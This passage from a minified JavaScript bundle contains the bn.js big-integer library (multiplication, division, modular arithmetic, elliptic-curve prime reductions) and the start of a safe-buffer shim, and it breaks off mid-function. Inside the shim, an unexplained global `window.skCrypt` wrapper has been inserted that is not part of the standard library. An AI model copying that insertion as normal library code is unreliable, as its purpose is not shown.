              ((((i = (i + Math.imul(N, mt)) | 0) + (o >>> 13)) | 0) +
                (Ot >>> 26)) |
              0),
              (Ot &= 67108863);
            var Mt =
              (((c + (r = Math.imul(U, pt))) | 0) +
                ((8191 &
                  (o = ((o = Math.imul(U, mt)) + Math.imul(q, pt)) | 0)) <<
                  13)) |
              0;
            return (
              (c =
                ((((i = Math.imul(q, mt)) + (o >>> 13)) | 0) + (Mt >>> 26)) |
                0),
              (Mt &= 67108863),
              (u[0] = gt),
              (u[1] = yt),
              (u[2] = wt),
              (u[3] = bt),
              (u[4] = vt),
              (u[5] = At),
              (u[6] = kt),
              (u[7] = It),
              (u[8] = St),
              (u[9] = _t),
              (u[10] = Tt),
              (u[11] = Ct),
              (u[12] = Bt),
              (u[13] = Et),
              (u[14] = xt),
              (u[15] = Pt),
              (u[16] = Rt),
              (u[17] = Ot),
              (u[18] = Mt),
              0 !== c && ((u[19] = c), n.length++),
              n
            );
          };
          function g(t, e, n) {
            (n.negative = e.negative ^ t.negative),
              (n.length = t.length + e.length);
            for (var r = 0, o = 0, i = 0; i < n.length - 1; i++) {
              var s = o;
              o = 0;
              for (
                var a = 67108863 & r,
                  u = Math.min(i, e.length - 1),
                  c = Math.max(0, i - t.length + 1);
                c <= u;
                c++
              ) {
                var l = i - c,
                  d = (0 | t.words[l]) * (0 | e.words[c]),
                  f = 67108863 & d;
                (a = 67108863 & (f = (f + a) | 0)),
                  (o +=
                    (s =
                      ((s = (s + ((d / 67108864) | 0)) | 0) + (f >>> 26)) |
                      0) >>> 26),
                  (s &= 67108863);
              }
              (n.words[i] = a), (r = s), (s = o);
            }
            return 0 !== r ? (n.words[i] = r) : n.length--, n._strip();
          }
          function y(t, e, n) {
            return g(t, e, n);
          }
          Math.imul || (m = p),
            (o.prototype.mulTo = function (t, e) {
              var n = this.length + t.length;
              return 10 === this.length && 10 === t.length
                ? m(this, t, e)
                : n < 63
                ? p(this, t, e)
                : n < 1024
                ? g(this, t, e)
                : y(this, t, e);
            }),
            (o.prototype.mul = function (t) {
              var e = new o(null);
              return (
                (e.words = new Array(this.length + t.length)), this.mulTo(t, e)
              );
            }),
            (o.prototype.mulf = function (t) {
              var e = new o(null);
              return (
                (e.words = new Array(this.length + t.length)), y(this, t, e)
              );
            }),
            (o.prototype.imul = function (t) {
              return this.clone().mulTo(t, this);
            }),
            (o.prototype.imuln = function (t) {
              var e = t < 0;
              e && (t = -t), n("number" == typeof t), n(t < 67108864);
              for (var r = 0, o = 0; o < this.length; o++) {
                var i = (0 | this.words[o]) * t,
                  s = (67108863 & i) + (67108863 & r);
                (r >>= 26),
                  (r += (i / 67108864) | 0),
                  (r += s >>> 26),
                  (this.words[o] = 67108863 & s);
              }
              return (
                0 !== r && ((this.words[o] = r), this.length++),
                (this.length = 0 === t ? 1 : this.length),
                e ? this.ineg() : this
              );
            }),
            (o.prototype.muln = function (t) {
              return this.clone().imuln(t);
            }),
            (o.prototype.sqr = function () {
              return this.mul(this);
            }),
            (o.prototype.isqr = function () {
              return this.imul(this.clone());
            }),
            (o.prototype.pow = function (t) {
              var e = (function (t) {
                for (
                  var e = new Array(t.bitLength()), n = 0;
                  n < e.length;
                  n++
                ) {
                  var r = (n / 26) | 0,
                    o = n % 26;
                  e[n] = (t.words[r] >>> o) & 1;
                }
                return e;
              })(t);
              if (0 === e.length) return new o(1);
              for (
                var n = this, r = 0;
                r < e.length && 0 === e[r];
                r++, n = n.sqr()
              );
              if (++r < e.length)
                for (var i = n.sqr(); r < e.length; r++, i = i.sqr())
                  0 !== e[r] && (n = n.mul(i));
              return n;
            }),
            (o.prototype.iushln = function (t) {
              n("number" == typeof t && t >= 0);
              var e,
                r = t % 26,
                o = (t - r) / 26,
                i = (67108863 >>> (26 - r)) << (26 - r);
              if (0 !== r) {
                var s = 0;
                for (e = 0; e < this.length; e++) {
                  var a = this.words[e] & i,
                    u = ((0 | this.words[e]) - a) << r;
                  (this.words[e] = u | s), (s = a >>> (26 - r));
                }
                s && ((this.words[e] = s), this.length++);
              }
              if (0 !== o) {
                for (e = this.length - 1; e >= 0; e--)
                  this.words[e + o] = this.words[e];
                for (e = 0; e < o; e++) this.words[e] = 0;
                this.length += o;
              }
              return this._strip();
            }),
            (o.prototype.ishln = function (t) {
              return n(0 === this.negative), this.iushln(t);
            }),
            (o.prototype.iushrn = function (t, e, r) {
              var o;
              n("number" == typeof t && t >= 0),
                (o = e ? (e - (e % 26)) / 26 : 0);
              var i = t % 26,
                s = Math.min((t - i) / 26, this.length),
                a = 67108863 ^ ((67108863 >>> i) << i),
                u = r;
              if (((o -= s), (o = Math.max(0, o)), u)) {
                for (var c = 0; c < s; c++) u.words[c] = this.words[c];
                u.length = s;
              }
              if (0 === s);
              else if (this.length > s)
                for (this.length -= s, c = 0; c < this.length; c++)
                  this.words[c] = this.words[c + s];
              else (this.words[0] = 0), (this.length = 1);
              var l = 0;
              for (c = this.length - 1; c >= 0 && (0 !== l || c >= o); c--) {
                var d = 0 | this.words[c];
                (this.words[c] = (l << (26 - i)) | (d >>> i)), (l = d & a);
              }
              return (
                u && 0 !== l && (u.words[u.length++] = l),
                0 === this.length && ((this.words[0] = 0), (this.length = 1)),
                this._strip()
              );
            }),
            (o.prototype.ishrn = function (t, e, r) {
              return n(0 === this.negative), this.iushrn(t, e, r);
            }),
            (o.prototype.shln = function (t) {
              return this.clone().ishln(t);
            }),
            (o.prototype.ushln = function (t) {
              return this.clone().iushln(t);
            }),
            (o.prototype.shrn = function (t) {
              return this.clone().ishrn(t);
            }),
            (o.prototype.ushrn = function (t) {
              return this.clone().iushrn(t);
            }),
            (o.prototype.testn = function (t) {
              n("number" == typeof t && t >= 0);
              var e = t % 26,
                r = (t - e) / 26,
                o = 1 << e;
              return !(this.length <= r || !(this.words[r] & o));
            }),
            (o.prototype.imaskn = function (t) {
              n("number" == typeof t && t >= 0);
              var e = t % 26,
                r = (t - e) / 26;
              if (
                (n(
                  0 === this.negative,
                  "imaskn works only with positive numbers"
                ),
                this.length <= r)
              )
                return this;
              if (
                (0 !== e && r++,
                (this.length = Math.min(r, this.length)),
                0 !== e)
              ) {
                var o = 67108863 ^ ((67108863 >>> e) << e);
                this.words[this.length - 1] &= o;
              }
              return this._strip();
            }),
            (o.prototype.maskn = function (t) {
              return this.clone().imaskn(t);
            }),
            (o.prototype.iaddn = function (t) {
              return (
                n("number" == typeof t),
                n(t < 67108864),
                t < 0
                  ? this.isubn(-t)
                  : 0 !== this.negative
                  ? 1 === this.length && (0 | this.words[0]) <= t
                    ? ((this.words[0] = t - (0 | this.words[0])),
                      (this.negative = 0),
                      this)
                    : ((this.negative = 0),
                      this.isubn(t),
                      (this.negative = 1),
                      this)
                  : this._iaddn(t)
              );
            }),
            (o.prototype._iaddn = function (t) {
              this.words[0] += t;
              for (var e = 0; e < this.length && this.words[e] >= 67108864; e++)
                (this.words[e] -= 67108864),
                  e === this.length - 1
                    ? (this.words[e + 1] = 1)
                    : this.words[e + 1]++;
              return (this.length = Math.max(this.length, e + 1)), this;
            }),
            (o.prototype.isubn = function (t) {
              if ((n("number" == typeof t), n(t < 67108864), t < 0))
                return this.iaddn(-t);
              if (0 !== this.negative)
                return (
                  (this.negative = 0), this.iaddn(t), (this.negative = 1), this
                );
              if (
                ((this.words[0] -= t), 1 === this.length && this.words[0] < 0)
              )
                (this.words[0] = -this.words[0]), (this.negative = 1);
              else
                for (var e = 0; e < this.length && this.words[e] < 0; e++)
                  (this.words[e] += 67108864), (this.words[e + 1] -= 1);
              return this._strip();
            }),
            (o.prototype.addn = function (t) {
              return this.clone().iaddn(t);
            }),
            (o.prototype.subn = function (t) {
              return this.clone().isubn(t);
            }),
            (o.prototype.iabs = function () {
              return (this.negative = 0), this;
            }),
            (o.prototype.abs = function () {
              return this.clone().iabs();
            }),
            (o.prototype._ishlnsubmul = function (t, e, r) {
              var o,
                i,
                s = t.length + r;
              this._expand(s);
              var a = 0;
              for (o = 0; o < t.length; o++) {
                i = (0 | this.words[o + r]) + a;
                var u = (0 | t.words[o]) * e;
                (a = ((i -= 67108863 & u) >> 26) - ((u / 67108864) | 0)),
                  (this.words[o + r] = 67108863 & i);
              }
              for (; o < this.length - r; o++)
                (a = (i = (0 | this.words[o + r]) + a) >> 26),
                  (this.words[o + r] = 67108863 & i);
              if (0 === a) return this._strip();
              for (n(-1 === a), a = 0, o = 0; o < this.length; o++)
                (a = (i = -(0 | this.words[o]) + a) >> 26),
                  (this.words[o] = 67108863 & i);
              return (this.negative = 1), this._strip();
            }),
            (o.prototype._wordDiv = function (t, e) {
              var n = (this.length, t.length),
                r = this.clone(),
                i = t,
                s = 0 | i.words[i.length - 1];
              0 != (n = 26 - this._countBits(s)) &&
                ((i = i.ushln(n)),
                r.iushln(n),
                (s = 0 | i.words[i.length - 1]));
              var a,
                u = r.length - i.length;
              if ("mod" !== e) {
                ((a = new o(null)).length = u + 1),
                  (a.words = new Array(a.length));
                for (var c = 0; c < a.length; c++) a.words[c] = 0;
              }
              var l = r.clone()._ishlnsubmul(i, 1, u);
              0 === l.negative && ((r = l), a && (a.words[u] = 1));
              for (var d = u - 1; d >= 0; d--) {
                var f =
                  67108864 * (0 | r.words[i.length + d]) +
                  (0 | r.words[i.length + d - 1]);
                for (
                  f = Math.min((f / s) | 0, 67108863), r._ishlnsubmul(i, f, d);
                  0 !== r.negative;

                )
                  f--,
                    (r.negative = 0),
                    r._ishlnsubmul(i, 1, d),
                    r.isZero() || (r.negative ^= 1);
                a && (a.words[d] = f);
              }
              return (
                a && a._strip(),
                r._strip(),
                "div" !== e && 0 !== n && r.iushrn(n),
                { div: a || null, mod: r }
              );
            }),
            (o.prototype.divmod = function (t, e, r) {
              return (
                n(!t.isZero()),
                this.isZero()
                  ? { div: new o(0), mod: new o(0) }
                  : 0 !== this.negative && 0 === t.negative
                  ? ((a = this.neg().divmod(t, e)),
                    "mod" !== e && (i = a.div.neg()),
                    "div" !== e &&
                      ((s = a.mod.neg()), r && 0 !== s.negative && s.iadd(t)),
                    { div: i, mod: s })
                  : 0 === this.negative && 0 !== t.negative
                  ? ((a = this.divmod(t.neg(), e)),
                    "mod" !== e && (i = a.div.neg()),
                    { div: i, mod: a.mod })
                  : 0 !== (this.negative & t.negative)
                  ? ((a = this.neg().divmod(t.neg(), e)),
                    "div" !== e &&
                      ((s = a.mod.neg()), r && 0 !== s.negative && s.isub(t)),
                    { div: a.div, mod: s })
                  : t.length > this.length || this.cmp(t) < 0
                  ? { div: new o(0), mod: this }
                  : 1 === t.length
                  ? "div" === e
                    ? { div: this.divn(t.words[0]), mod: null }
                    : "mod" === e
                    ? { div: null, mod: new o(this.modrn(t.words[0])) }
                    : {
                        div: this.divn(t.words[0]),
                        mod: new o(this.modrn(t.words[0])),
                      }
                  : this._wordDiv(t, e)
              );
              var i, s, a;
            }),
            (o.prototype.div = function (t) {
              return this.divmod(t, "div", !1).div;
            }),
            (o.prototype.mod = function (t) {
              return this.divmod(t, "mod", !1).mod;
            }),
            (o.prototype.umod = function (t) {
              return this.divmod(t, "mod", !0).mod;
            }),
            (o.prototype.divRound = function (t) {
              var e = this.divmod(t);
              if (e.mod.isZero()) return e.div;
              var n = 0 !== e.div.negative ? e.mod.isub(t) : e.mod,
                r = t.ushrn(1),
                o = t.andln(1),
                i = n.cmp(r);
              return i < 0 || (1 === o && 0 === i)
                ? e.div
                : 0 !== e.div.negative
                ? e.div.isubn(1)
                : e.div.iaddn(1);
            }),
            (o.prototype.modrn = function (t) {
              var e = t < 0;
              e && (t = -t), n(t <= 67108863);
              for (
                var r = (1 << 26) % t, o = 0, i = this.length - 1;
                i >= 0;
                i--
              )
                o = (r * o + (0 | this.words[i])) % t;
              return e ? -o : o;
            }),
            (o.prototype.modn = function (t) {
              return this.modrn(t);
            }),
            (o.prototype.idivn = function (t) {
              var e = t < 0;
              e && (t = -t), n(t <= 67108863);
              for (var r = 0, o = this.length - 1; o >= 0; o--) {
                var i = (0 | this.words[o]) + 67108864 * r;
                (this.words[o] = (i / t) | 0), (r = i % t);
              }
              return this._strip(), e ? this.ineg() : this;
            }),
            (o.prototype.divn = function (t) {
              return this.clone().idivn(t);
            }),
            (o.prototype.egcd = function (t) {
              n(0 === t.negative), n(!t.isZero());
              var e = this,
                r = t.clone();
              e = 0 !== e.negative ? e.umod(t) : e.clone();
              for (
                var i = new o(1),
                  s = new o(0),
                  a = new o(0),
                  u = new o(1),
                  c = 0;
                e.isEven() && r.isEven();

              )
                e.iushrn(1), r.iushrn(1), ++c;
              for (var l = r.clone(), d = e.clone(); !e.isZero(); ) {
                for (
                  var f = 0, h = 1;
                  0 === (e.words[0] & h) && f < 26;
                  ++f, h <<= 1
                );
                if (f > 0)
                  for (e.iushrn(f); f-- > 0; )
                    (i.isOdd() || s.isOdd()) && (i.iadd(l), s.isub(d)),
                      i.iushrn(1),
                      s.iushrn(1);
                for (
                  var p = 0, m = 1;
                  0 === (r.words[0] & m) && p < 26;
                  ++p, m <<= 1
                );
                if (p > 0)
                  for (r.iushrn(p); p-- > 0; )
                    (a.isOdd() || u.isOdd()) && (a.iadd(l), u.isub(d)),
                      a.iushrn(1),
                      u.iushrn(1);
                e.cmp(r) >= 0
                  ? (e.isub(r), i.isub(a), s.isub(u))
                  : (r.isub(e), a.isub(i), u.isub(s));
              }
              return { a: a, b: u, gcd: r.iushln(c) };
            }),
            (o.prototype._invmp = function (t) {
              n(0 === t.negative), n(!t.isZero());
              var e = this,
                r = t.clone();
              e = 0 !== e.negative ? e.umod(t) : e.clone();
              for (
                var i, s = new o(1), a = new o(0), u = r.clone();
                e.cmpn(1) > 0 && r.cmpn(1) > 0;

              ) {
                for (
                  var c = 0, l = 1;
                  0 === (e.words[0] & l) && c < 26;
                  ++c, l <<= 1
                );
                if (c > 0)
                  for (e.iushrn(c); c-- > 0; )
                    s.isOdd() && s.iadd(u), s.iushrn(1);
                for (
                  var d = 0, f = 1;
                  0 === (r.words[0] & f) && d < 26;
                  ++d, f <<= 1
                );
                if (d > 0)
                  for (r.iushrn(d); d-- > 0; )
                    a.isOdd() && a.iadd(u), a.iushrn(1);
                e.cmp(r) >= 0 ? (e.isub(r), s.isub(a)) : (r.isub(e), a.isub(s));
              }
              return (i = 0 === e.cmpn(1) ? s : a).cmpn(0) < 0 && i.iadd(t), i;
            }),
            (o.prototype.gcd = function (t) {
              if (this.isZero()) return t.abs();
              if (t.isZero()) return this.abs();
              var e = this.clone(),
                n = t.clone();
              (e.negative = 0), (n.negative = 0);
              for (var r = 0; e.isEven() && n.isEven(); r++)
                e.iushrn(1), n.iushrn(1);
              for (;;) {
                for (; e.isEven(); ) e.iushrn(1);
                for (; n.isEven(); ) n.iushrn(1);
                var o = e.cmp(n);
                if (o < 0) {
                  var i = e;
                  (e = n), (n = i);
                } else if (0 === o || 0 === n.cmpn(1)) break;
                e.isub(n);
              }
              return n.iushln(r);
            }),
            (o.prototype.invm = function (t) {
              return this.egcd(t).a.umod(t);
            }),
            (o.prototype.isEven = function () {
              return !(1 & this.words[0]);
            }),
            (o.prototype.isOdd = function () {
              return !(1 & ~this.words[0]);
            }),
            (o.prototype.andln = function (t) {
              return this.words[0] & t;
            }),
            (o.prototype.bincn = function (t) {
              n("number" == typeof t);
              var e = t % 26,
                r = (t - e) / 26,
                o = 1 << e;
              if (this.length <= r)
                return this._expand(r + 1), (this.words[r] |= o), this;
              for (var i = o, s = r; 0 !== i && s < this.length; s++) {
                var a = 0 | this.words[s];
                (i = (a += i) >>> 26), (a &= 67108863), (this.words[s] = a);
              }
              return 0 !== i && ((this.words[s] = i), this.length++), this;
            }),
            (o.prototype.isZero = function () {
              return 1 === this.length && 0 === this.words[0];
            }),
            (o.prototype.cmpn = function (t) {
              var e,
                r = t < 0;
              if (0 !== this.negative && !r) return -1;
              if (0 === this.negative && r) return 1;
              if ((this._strip(), this.length > 1)) e = 1;
              else {
                r && (t = -t), n(t <= 67108863, "Number is too big");
                var o = 0 | this.words[0];
                e = o === t ? 0 : o < t ? -1 : 1;
              }
              return 0 !== this.negative ? 0 | -e : e;
            }),
            (o.prototype.cmp = function (t) {
              if (0 !== this.negative && 0 === t.negative) return -1;
              if (0 === this.negative && 0 !== t.negative) return 1;
              var e = this.ucmp(t);
              return 0 !== this.negative ? 0 | -e : e;
            }),
            (o.prototype.ucmp = function (t) {
              if (this.length > t.length) return 1;
              if (this.length < t.length) return -1;
              for (var e = 0, n = this.length - 1; n >= 0; n--) {
                var r = 0 | this.words[n],
                  o = 0 | t.words[n];
                if (r !== o) {
                  r < o ? (e = -1) : r > o && (e = 1);
                  break;
                }
              }
              return e;
            }),
            (o.prototype.gtn = function (t) {
              return 1 === this.cmpn(t);
            }),
            (o.prototype.gt = function (t) {
              return 1 === this.cmp(t);
            }),
            (o.prototype.gten = function (t) {
              return this.cmpn(t) >= 0;
            }),
            (o.prototype.gte = function (t) {
              return this.cmp(t) >= 0;
            }),
            (o.prototype.ltn = function (t) {
              return -1 === this.cmpn(t);
            }),
            (o.prototype.lt = function (t) {
              return -1 === this.cmp(t);
            }),
            (o.prototype.lten = function (t) {
              return this.cmpn(t) <= 0;
            }),
            (o.prototype.lte = function (t) {
              return this.cmp(t) <= 0;
            }),
            (o.prototype.eqn = function (t) {
              return 0 === this.cmpn(t);
            }),
            (o.prototype.eq = function (t) {
              return 0 === this.cmp(t);
            }),
            (o.red = function (t) {
              return new S(t);
            }),
            (o.prototype.toRed = function (t) {
              return (
                n(!this.red, "Already a number in reduction context"),
                n(0 === this.negative, "red works only with positives"),
                t.convertTo(this)._forceRed(t)
              );
            }),
            (o.prototype.fromRed = function () {
              return (
                n(
                  this.red,
                  "fromRed works only with numbers in reduction context"
                ),
                this.red.convertFrom(this)
              );
            }),
            (o.prototype._forceRed = function (t) {
              return (this.red = t), this;
            }),
            (o.prototype.forceRed = function (t) {
              return (
                n(!this.red, "Already a number in reduction context"),
                this._forceRed(t)
              );
            }),
            (o.prototype.redAdd = function (t) {
              return (
                n(this.red, "redAdd works only with red numbers"),
                this.red.add(this, t)
              );
            }),
            (o.prototype.redIAdd = function (t) {
              return (
                n(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, t)
              );
            }),
            (o.prototype.redSub = function (t) {
              return (
                n(this.red, "redSub works only with red numbers"),
                this.red.sub(this, t)
              );
            }),
            (o.prototype.redISub = function (t) {
              return (
                n(this.red, "redISub works only with red numbers"),
                this.red.isub(this, t)
              );
            }),
            (o.prototype.redShl = function (t) {
              return (
                n(this.red, "redShl works only with red numbers"),
                this.red.shl(this, t)
              );
            }),
            (o.prototype.redMul = function (t) {
              return (
                n(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, t),
                this.red.mul(this, t)
              );
            }),
            (o.prototype.redIMul = function (t) {
              return (
                n(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, t),
                this.red.imul(this, t)
              );
            }),
            (o.prototype.redSqr = function () {
              return (
                n(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
              );
            }),
            (o.prototype.redISqr = function () {
              return (
                n(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
              );
            }),
            (o.prototype.redSqrt = function () {
              return (
                n(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
              );
            }),
            (o.prototype.redInvm = function () {
              return (
                n(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
              );
            }),
            (o.prototype.redNeg = function () {
              return (
                n(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
              );
            }),
            (o.prototype.redPow = function (t) {
              return (
                n(this.red && !t.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, t)
              );
            });
          var w = { k256: null, p224: null, p192: null, p25519: null };
          function b(t, e) {
            (this.name = t),
              (this.p = new o(e, 16)),
              (this.n = this.p.bitLength()),
              (this.k = new o(1).iushln(this.n).isub(this.p)),
              (this.tmp = this._tmp());
          }
          function v() {
            b.call(
              this,
              "k256",
              "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f"
            );
          }
          function A() {
            b.call(
              this,
              "p224",
              "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001"
            );
          }
          function k() {
            b.call(
              this,
              "p192",
              "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff"
            );
          }
          function I() {
            b.call(
              this,
              "25519",
              "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed"
            );
          }
          function S(t) {
            if ("string" == typeof t) {
              var e = o._prime(t);
              (this.m = e.p), (this.prime = e);
            } else
              n(t.gtn(1), "modulus must be greater than 1"),
                (this.m = t),
                (this.prime = null);
          }
          function _(t) {
            S.call(this, t),
              (this.shift = this.m.bitLength()),
              this.shift % 26 != 0 && (this.shift += 26 - (this.shift % 26)),
              (this.r = new o(1).iushln(this.shift)),
              (this.r2 = this.imod(this.r.sqr())),
              (this.rinv = this.r._invmp(this.m)),
              (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
              (this.minv = this.minv.umod(this.r)),
              (this.minv = this.r.sub(this.minv));
          }
          (b.prototype._tmp = function () {
            var t = new o(null);
            return (t.words = new Array(Math.ceil(this.n / 13))), t;
          }),
            (b.prototype.ireduce = function (t) {
              var e,
                n = t;
              do {
                this.split(n, this.tmp),
                  (e = (n = (n = this.imulK(n)).iadd(this.tmp)).bitLength());
              } while (e > this.n);
              var r = e < this.n ? -1 : n.ucmp(this.p);
              return (
                0 === r
                  ? ((n.words[0] = 0), (n.length = 1))
                  : r > 0
                  ? n.isub(this.p)
                  : void 0 !== n.strip
                  ? n.strip()
                  : n._strip(),
                n
              );
            }),
            (b.prototype.split = function (t, e) {
              t.iushrn(this.n, 0, e);
            }),
            (b.prototype.imulK = function (t) {
              return t.imul(this.k);
            }),
            r(v, b),
            (v.prototype.split = function (t, e) {
              for (
                var n = 4194303, r = Math.min(t.length, 9), o = 0;
                o < r;
                o++
              )
                e.words[o] = t.words[o];
              if (((e.length = r), t.length <= 9))
                return (t.words[0] = 0), (t.length = 1), void 0;
              var i = t.words[9];
              for (e.words[e.length++] = i & n, o = 10; o < t.length; o++) {
                var s = 0 | t.words[o];
                (t.words[o - 10] = ((s & n) << 4) | (i >>> 22)), (i = s);
              }
              (i >>>= 22),
                (t.words[o - 10] = i),
                0 === i && t.length > 10 ? (t.length -= 10) : (t.length -= 9);
            }),
            (v.prototype.imulK = function (t) {
              (t.words[t.length] = 0),
                (t.words[t.length + 1] = 0),
                (t.length += 2);
              for (var e = 0, n = 0; n < t.length; n++) {
                var r = 0 | t.words[n];
                (e += 977 * r),
                  (t.words[n] = 67108863 & e),
                  (e = 64 * r + ((e / 67108864) | 0));
              }
              return (
                0 === t.words[t.length - 1] &&
                  (t.length--, 0 === t.words[t.length - 1] && t.length--),
                t
              );
            }),
            r(A, b),
            r(k, b),
            r(I, b),
            (I.prototype.imulK = function (t) {
              for (var e = 0, n = 0; n < t.length; n++) {
                var r = 19 * (0 | t.words[n]) + e,
                  o = 67108863 & r;
                (r >>>= 26), (t.words[n] = o), (e = r);
              }
              return 0 !== e && (t.words[t.length++] = e), t;
            }),
            (o._prime = function (t) {
              if (w[t]) return w[t];
              var e;
              if ("k256" === t) e = new v();
              else if ("p224" === t) e = new A();
              else if ("p192" === t) e = new k();
              else {
                if ("p25519" !== t) throw new Error("Unknown prime " + t);
                e = new I();
              }
              return (w[t] = e), e;
            }),
            (S.prototype._verify1 = function (t) {
              n(0 === t.negative, "red works only with positives"),
                n(t.red, "red works only with red numbers");
            }),
            (S.prototype._verify2 = function (t, e) {
              n(
                0 === (t.negative | e.negative),
                "red works only with positives"
              ),
                n(t.red && t.red === e.red, "red works only with red numbers");
            }),
            (S.prototype.imod = function (t) {
              return this.prime
                ? this.prime.ireduce(t)._forceRed(this)
                : (c(t, t.umod(this.m)._forceRed(this)), t);
            }),
            (S.prototype.neg = function (t) {
              return t.isZero() ? t.clone() : this.m.sub(t)._forceRed(this);
            }),
            (S.prototype.add = function (t, e) {
              this._verify2(t, e);
              var n = t.add(e);
              return n.cmp(this.m) >= 0 && n.isub(this.m), n._forceRed(this);
            }),
            (S.prototype.iadd = function (t, e) {
              this._verify2(t, e);
              var n = t.iadd(e);
              return n.cmp(this.m) >= 0 && n.isub(this.m), n;
            }),
            (S.prototype.sub = function (t, e) {
              this._verify2(t, e);
              var n = t.sub(e);
              return n.cmpn(0) < 0 && n.iadd(this.m), n._forceRed(this);
            }),
            (S.prototype.isub = function (t, e) {
              this._verify2(t, e);
              var n = t.isub(e);
              return n.cmpn(0) < 0 && n.iadd(this.m), n;
            }),
            (S.prototype.shl = function (t, e) {
              return this._verify1(t), this.imod(t.ushln(e));
            }),
            (S.prototype.imul = function (t, e) {
              return this._verify2(t, e), this.imod(t.imul(e));
            }),
            (S.prototype.mul = function (t, e) {
              return this._verify2(t, e), this.imod(t.mul(e));
            }),
            (S.prototype.isqr = function (t) {
              return this.imul(t, t.clone());
            }),
            (S.prototype.sqr = function (t) {
              return this.mul(t, t);
            }),
            (S.prototype.sqrt = function (t) {
              if (t.isZero()) return t.clone();
              var e = this.m.andln(3);
              if ((n(e % 2 == 1), 3 === e)) {
                var r = this.m.add(new o(1)).iushrn(2);
                return this.pow(t, r);
              }
              for (
                var i = this.m.subn(1), s = 0;
                !i.isZero() && 0 === i.andln(1);

              )
                s++, i.iushrn(1);
              n(!i.isZero());
              var a = new o(1).toRed(this),
                u = a.redNeg(),
                c = this.m.subn(1).iushrn(1),
                l = this.m.bitLength();
              for (
                l = new o(2 * l * l).toRed(this);
                0 !== this.pow(l, c).cmp(u);

              )
                l.redIAdd(u);
              for (
                var d = this.pow(l, i),
                  f = this.pow(t, i.addn(1).iushrn(1)),
                  h = this.pow(t, i),
                  p = s;
                0 !== h.cmp(a);

              ) {
                for (var m = h, g = 0; 0 !== m.cmp(a); g++) m = m.redSqr();
                n(g < p);
                var y = this.pow(d, new o(1).iushln(p - g - 1));
                (f = f.redMul(y)), (d = y.redSqr()), (h = h.redMul(d)), (p = g);
              }
              return f;
            }),
            (S.prototype.invm = function (t) {
              var e = t._invmp(this.m);
              return 0 !== e.negative
                ? ((e.negative = 0), this.imod(e).redNeg())
                : this.imod(e);
            }),
            (S.prototype.pow = function (t, e) {
              if (e.isZero()) return new o(1).toRed(this);
              if (0 === e.cmpn(1)) return t.clone();
              var n = new Array(16);
              (n[0] = new o(1).toRed(this)), (n[1] = t);
              for (var r = 2; r < n.length; r++) n[r] = this.mul(n[r - 1], t);
              var i = n[0],
                s = 0,
                a = 0,
                u = e.bitLength() % 26;
              for (0 === u && (u = 26), r = e.length - 1; r >= 0; r--) {
                for (var c = e.words[r], l = u - 1; l >= 0; l--) {
                  var d = (c >> l) & 1;
                  i !== n[0] && (i = this.sqr(i)),
                    0 !== d || 0 !== s
                      ? ((s <<= 1),
                        (s |= d),
                        (4 === ++a || (0 === r && 0 === l)) &&
                          ((i = this.mul(i, n[s])), (a = 0), (s = 0)))
                      : (a = 0);
                }
                u = 26;
              }
              return i;
            }),
            (S.prototype.convertTo = function (t) {
              var e = t.umod(this.m);
              return e === t ? e.clone() : e;
            }),
            (S.prototype.convertFrom = function (t) {
              var e = t.clone();
              return (e.red = null), e;
            }),
            (o.mont = function (t) {
              return new _(t);
            }),
            r(_, S),
            (_.prototype.convertTo = function (t) {
              return this.imod(t.ushln(this.shift));
            }),
            (_.prototype.convertFrom = function (t) {
              var e = this.imod(t.mul(this.rinv));
              return (e.red = null), e;
            }),
            (_.prototype.imul = function (t, e) {
              if (t.isZero() || e.isZero())
                return (t.words[0] = 0), (t.length = 1), t;
              var n = t.imul(e),
                r = n
                  .maskn(this.shift)
                  .mul(this.minv)
                  .imaskn(this.shift)
                  .mul(this.m),
                o = n.isub(r).iushrn(this.shift),
                i = o;
              return (
                o.cmp(this.m) >= 0
                  ? (i = o.isub(this.m))
                  : o.cmpn(0) < 0 && (i = o.iadd(this.m)),
                i._forceRed(this)
              );
            }),
            (_.prototype.mul = function (t, e) {
              if (t.isZero() || e.isZero()) return new o(0)._forceRed(this);
              var n = t.mul(e),
                r = n
                  .maskn(this.shift)
                  .mul(this.minv)
                  .imaskn(this.shift)
                  .mul(this.m),
                i = n.isub(r).iushrn(this.shift),
                s = i;
              return (
                i.cmp(this.m) >= 0
                  ? (s = i.isub(this.m))
                  : i.cmpn(0) < 0 && (s = i.iadd(this.m)),
                s._forceRed(this)
              );
            }),
            (_.prototype.invm = function (t) {
              return this.imod(t._invmp(this.m).mul(this.r2))._forceRed(this);
            });
        })(t, Vn)),
      Kn.exports
    );
    var t;
  }
  var Xn = Hn();
  const Zn = Un(Xn);
  var Jn,
    Yn,
    Qn,
    $n,
    tr,
    er = { exports: {} };
  function nr() {
    return (
      Jn ||
        ((Jn = 1),
        (function (t, e) {
          window.skCrypt = function (t) {
            return function () {
              return t;
            };
          };
          var n = jn(),
            r = n.Buffer;
          function o(t, e) {
            for (var n in t) e[n] = t[n];
          }
          function i(t, e, n) {
            return r(t, e, n);
          }
          r.from && r.alloc && r.allocUnsafe && r.allocUnsafeSlow
            ? (t.exports = n)
            : (o(n, e), (e.Buffer = i)),
            (i.prototype = Object.create(r.prototype)),
            o(r, i),
            (i.from = function (t, e, n) {
              if ("number" == typeof t)
                throw new TypeError("Argument must not be a number");
              return r(t, e, n);
            }),
            (i.alloc = function (t, e, n) {
              if ("number" != typeof t)
                throw new TypeError("Argument must be a number");
              var o = r(t);
              return (
                void 0 !== e
                  ? "string" == typeof n
                    ? o.fill(e, n)
                    : o.fill(e)
                  : o.fill(0),
                o
              );
            }),
